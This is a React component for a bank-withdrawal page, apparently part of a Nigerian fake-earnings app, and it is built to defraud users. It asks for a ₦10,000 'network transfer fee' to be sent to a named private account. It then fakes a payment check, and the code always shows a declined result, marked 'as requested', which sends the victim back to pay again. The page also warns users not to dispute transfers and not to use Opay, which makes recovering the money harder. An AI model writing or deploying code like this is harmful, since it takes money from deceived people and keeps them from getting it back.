import React, { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Card, CardContent } from '@/components/ui/card';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '@/components/ui/dialog';
import { ArrowLeft, Copy, Loader2, CheckCircle, AlertCircle } from 'lucide-react';
import { nigerianBanks } from '@/utils/banks';
import { toast } from '@/hooks/use-toast';

interface WithdrawalPageProps {
  onBack: () => void;
  balance: number;
  onWithdraw: (amount: number) => void;
}

const WithdrawalPage: React.FC<WithdrawalPageProps> = ({ onBack, balance, onWithdraw }) => {
  const [accountNumber, setAccountNumber] = useState('');
  const [selectedBank, setSelectedBank] = useState('');
  const [accountName, setAccountName] = useState('');
  const [amount, setAmount] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showWithdrawalNotice, setShowWithdrawalNotice] = useState(false);
  const [showPaymentDetails, setShowPaymentDetails] = useState(false);
  const [showTransferNotice, setShowTransferNotice] = useState(false);
  const [showProcessingPayment, setShowProcessingPayment] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showDeclined, setShowDeclined] = useState(false);

  const handleProceed = () => {
    if (!accountNumber || !selectedBank || !accountName || !amount) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        duration: 3000,
      });
      return;
    }

    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setShowWithdrawalNotice(true);
    }, 3000);
  };

  const handleWithdrawalNoticeConfirm = () => {
    setShowWithdrawalNotice(false);
    setIsLoading(true);
    
    setTimeout(() => {
      setIsLoading(false);
      setShowPaymentDetails(true);
      // Auto show transfer notice after showing payment details
      setTimeout(() => {
        setShowTransferNotice(true);
      }, 500);
    }, 5000);
  };

  const handleContinuePayment = () => {
    setShowTransferNotice(false);
  };

  const handlePaymentConfirm = () => {
    setShowPaymentDetails(false);
    setShowProcessingPayment(true);
    
    setTimeout(() => {
      setShowProcessingPayment(false);
      // Always show declined (as requested)
      setShowDeclined(true);
    }, 10000);
  };

  const handleSuccessClose = () => {
    setShowSuccess(false);
    onBack();
  };

  const handleDeclinedRetry = () => {
    setShowDeclined(false);
    setShowPaymentDetails(true);
  };

  const copyToClipboard = (text: string, label: string) => {
    navigator.clipboard.writeText(text);
    toast({
      title: "Copied!",
      description: `${label} copied to clipboard`,
      duration: 2000,
    });
  };

  return (
    <>
      <div className="min-h-screen bg-gray-50">
        {/* Header */}
        <div className="bg-white px-4 py-4 shadow-sm">
          <div className="flex items-center space-x-3">
            <button
              onClick={onBack}
              className="p-2 hover:bg-gray-100 rounded-full transition-colors"
            >
              <ArrowLeft className="w-6 h-6 text-gray-600" />
            </button>
            <h1 className="text-xl font-semibold text-gray-900">Withdraw To Bank Account</h1>
          </div>
        </div>

        <div className="px-4 py-6">
          <Card>
            <CardContent className="p-6 space-y-6">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Account Number</label>
                <Input
                  placeholder="Enter account number"
                  value={accountNumber}
                  onChange={(e) => setAccountNumber(e.target.value)}
                  className="w-full"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
                <Select value={selectedBank} onValueChange={setSelectedBank}>
                  <SelectTrigger className="w-full">
                    <SelectValue placeholder="Select Bank" />
                  </SelectTrigger>
                  <SelectContent>
                    {nigerianBanks.map((bank) => (
                      <SelectItem key={bank} value={bank}>
                        {bank}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Account Name</label>
                <Input
                  placeholder="Account Name"
                  value={accountName}
                  onChange={(e) => setAccountName(e.target.value)}
                  className="w-full"
                />
              </div>

              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Amount</label>
                <Input
                  placeholder="Enter amount"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                  type="number"
                  className="w-full"
                />
              </div>

              <div className="text-center">
                <p className="text-lg font-semibold text-green-600">
                  Available Balance: ₦{balance.toLocaleString()}.00
                </p>
              </div>

              <Button
                onClick={handleProceed}
                disabled={isLoading}
                className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full"
              >
                {isLoading ? (
                  <div className="flex items-center space-x-2">
                    <Loader2 className="w-4 h-4 animate-spin" />
                    <span>Processing...</span>
                  </div>
                ) : (
                  'Proceed'
                )}
              </Button>
            </CardContent>
          </Card>
        </div>
      </div>

      {/* Withdrawal Notice Dialog */}
      <Dialog open={showWithdrawalNotice} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <DialogHeader>
            <DialogTitle className="text-center">Withdrawal Notice</DialogTitle>
          </DialogHeader>
          <div className="text-center py-4">
            <p className="text-gray-600 mb-4">
              Withdrawal placed, you will be paying ₦10,000 as a network transfer fee to approve this transaction click on proceed to continue 
            </p>
            <div className="flex space-x-3">
              <Button variant="outline" onClick={() => setShowWithdrawalNotice(false)} className="flex-1">
                Back
              </Button>
              <Button onClick={handleWithdrawalNoticeConfirm} className="flex-1 bg-green-600 hover:bg-green-700">
                Proceed
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Payment Details Dialog - Full Screen */}
      <Dialog open={showPaymentDetails} onOpenChange={() => {}}>
        <DialogContent className="max-w-full w-full h-full border-0 bg-white p-0 m-0 rounded-none">
          <div className="flex items-center justify-center h-full p-4">
            <div className="max-w-sm w-full space-y-6">
              <div className="text-center space-y-4">
                <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
                  <div className="w-8 h-8 bg-green-600 rounded flex items-center justify-center">
                    <div className="w-4 h-2 bg-white rounded"></div>
                  </div>
                </div>
                
                <h2 className="text-2xl font-semibold">Make Payment</h2>
                <p className="text-gray-600">Transfer to the account below</p>

                <div className="space-y-3">
                  <div className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                    <div>
                      <p className="text-sm text-gray-600">Account Number</p>
                      <p className="font-semibold">1000045414</p>
                    </div>
                    <button 
                      onClick={() => copyToClipboard('8973416638', 'Account number')}
                      className="p-2 hover:bg-gray-200 rounded-full"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>

                  <div className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                    <div>
                      <p className="text-sm text-gray-600">Bank Name</p>
                      <p className="font-semibold">ASSETS MFB</p>
                    </div>
                    <button 
                      onClick={() => copyToClipboard('ASSETS MFB', 'Bank name')}
                      className="p-2 hover:bg-gray-200 rounded-full"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>

                  <div className="flex justify-between items-center p-3 bg-gray-50 rounded-lg">
                    <div>
                      <p className="text-sm text-gray-600">Account Name</p>
                      <p className="font-semibold">fairpay-jude Samuel</p>
                    </div>
                    <button 
                      onClick={() => copyToClipboard('fairpay-jude Samuel', 'Account name')}
                      className="p-2 hover:bg-gray-200 rounded-full"
                    >
                      <Copy className="w-4 h-4" />
                    </button>
                  </div>
                </div>

                <div className="p-4 bg-green-50 border border-green-200 rounded-lg">
                  <p className="text-sm text-gray-600">Fee</p>
                  <p className="text-2xl font-bold text-green-600">₦10,000</p>
                  
                  <Button 
                    onClick={handlePaymentConfirm}
                    className="w-full bg-green-600 hover:bg-green-700 text-white py-3 rounded-full mt-4"
                  >
                    I have paid
                  </Button>
                </div>
              </div>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Transfer Notice Dialog */}
      <Dialog open={showTransferNotice} onOpenChange={() => {}}>
        <DialogContent className="max-w-sm mx-auto">
          <div className="text-center py-4 space-y-4">
            <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto">
              <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center">
                <div className="w-4 h-4 bg-white rounded-full"></div>
              </div>
            </div>
            
            <h2 className="text-xl font-semibold">Pay NGN ₦10,000.00</h2>
            <p className="text-gray-600">Before you make this transfer</p>

            <div className="space-y-3 text-left">
              <div className="flex items-start space-x-3">
                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                <div>
                  <p className="font-semibold text-orange-600">Transfer only the exact amount</p>
                  <p className="text-sm text-gray-600">Do not transfer an incorrect amount.</p>
                </div>
              </div>

              <div className="flex items-start space-x-3">
                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                <div>
                  <p className="font-semibold text-orange-600">Do not dispute any transactions made  to our account</p>
                  <p className="text-sm text-gray-600">It can cause restrictions and other impacts.</p>
                </div>
              </div>

              <div className="flex items-start space-x-3">
                <CheckCircle className="w-5 h-5 text-green-600 mt-0.5" />
                <div>
                  <p className="font-semibold text-orange-600">Avoid using Opay bank for your payment</p>
                  <p className="text-sm text-gray-600">This can lead to delays is verifying your payment.</p>
                </div>
              </div>

              <div className="flex items-start space-x-3 p-3 bg-blue-50 rounded">
                <input type="checkbox" className="mt-1" defaultChecked />
                <p className="text-sm">I understand these instructions.</p>
              </div>
            </div>

            <Button 
              onClick={handleContinuePayment}
              className="w-full bg-green-600 hover:bg-green-700 text-white"
            >
              Continue Payment
            </Button>
          </div>
        </DialogContent>
      </Dialog>

      {/* Processing Payment Dialog - Full Screen */}
      <Dialog open={showProcessingPayment} onOpenChange={() => {}}>
        <DialogContent className="max-w-full w-full h-full border-0 bg-green-600 text-white p-0 m-0 rounded-none">
          <div className="flex items-center justify-center h-full">
            <div className="text-center space-y-6">
              <h2 className="text-3xl font-bold">Verifying Payment</h2>
              <div className="flex justify-center">
                <div className="w-20 h-20 border-4 border-white border-t-transparent rounded-full animate-spin"></div>
              </div>
              <p className="text-green-100 text-lg">Please wait while we verify your payment...</p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
   
      {/* Payment Declined Dialog - Full Screen */}
      <Dialog open={showDeclined} onOpenChange={() => {}}>
        <DialogContent className="max-w-full w-full h-full border-0 bg-gray-100 p-0 m-0 rounded-none">
          <div className="flex items-center justify-center h-full p-4">
            <div className="bg-white rounded-lg p-8 max-w-sm w-full text-center space-y-6">
              <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto">
                <AlertCircle className="w-8 h-8 text-red-600" />
              </div>
              
              <div>
                <h2 className="text-2xl font-bold text-red-600 mb-2">Payment Not Confirmed</h2>
                <p className="text-gray-600">
                  Payment not confirmed. Please don't dispute any transfer to us. Contact support instead.
                </p>
              </div>

              <Button 
                onClick={handleDeclinedRetry}
                className="w-full bg-red-600 hover:bg-red-700 text-white py-3 rounded-full"
              >
                Go Back
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </>
  );
};

export default WithdrawalPage;
